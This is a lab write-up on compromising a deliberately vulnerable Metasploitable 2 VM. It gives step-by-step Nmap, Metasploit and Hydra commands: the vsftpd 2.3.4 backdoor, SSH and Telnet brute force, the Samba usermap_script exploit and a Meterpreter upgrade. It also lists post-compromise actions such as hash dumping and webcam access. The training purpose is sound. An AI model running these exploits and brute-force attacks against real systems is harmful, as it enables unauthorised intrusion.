# Lab 05 — Privilege escalation on a Metasploitable machine

Exploiting the vulnerable services on a Metasploitable 2 virtual machine — a
deliberately vulnerable Linux target built for training — using Metasploit, Hydra
and Nmap.

**Target:** `192.168.100.9` (lab VM, isolated network)

## Recon

Confirm the target address, then version-scan it and save the results:

```bash
nmap -sV -p 1-1000 192.168.100.9
```

Open ports and services found:

| Port | Service |
|------|---------|
| 21 | FTP — vsftpd 2.3.4 |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 80 | HTTP |
| 111 | RPC |
| 139 / 445 | SMB — Samba 3.0.20 |

## Port 21 — FTP (vsftpd 2.3.4)

vsftpd 2.3.4 has a known backdoor. Searching the version turns up the Metasploit
module for it — load it, set the target, run it:

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.9
set RPORT 21
run
```

Result: a shell on the target. `whoami` returns **root**.

## Port 22 — SSH, by brute force

Two ways, same credentials.

**Metasploit auxiliary scanner:**

```bash
search ssh_login
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.100.9
set USER_FILE <usernames wordlist>
set PASS_FILE <passwords wordlist>
run
```

**Hydra:**

```bash
sudo hydra -L <usernames wordlist> -P <passwords wordlist> 192.168.100.9 ssh -t 4
```

Both gather the same credentials. Log in over SSH and confirm with `whoami`.

## Port 23 — Telnet

Telnet is SSH without the encryption. Same approach — Hydra brute-forces the
credentials, then connect directly:

```bash
sudo hydra -L <usernames wordlist> -P <passwords wordlist> 192.168.100.9 telnet
telnet 192.168.100.9
```

Log in with the recovered credentials and confirm the session.

## Port 139/445 — SMB (Samba 3.0.20)

The banner does not give the exact version, so scan for it first:

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.100.9
run
```

Result: **Samba 3.0.20** — vulnerable to remote code execution. The Metasploit
module for it:

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.100.9
set RPORT 139
show payloads
run
```

Result: a command shell session. Upgrade it to a full Meterpreter session with the
shell-to-Meterpreter post module:

```bash
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
sessions -i <new session id>
```

## After compromise

With a Meterpreter session open you can upload and download files, interact with
the target's webcam, dump hashes, and pivot further — all inside the lab.

## Takeaway

Four services, four different paths to the same outcome: FTP handed over root
through a backdoor, SSH and Telnet fell to weak credentials, and SMB fell to an
unpatched version. Every one of these is fixed by the basics — patch, disable what
you don't use, and never allow weak or default passwords on a network service.
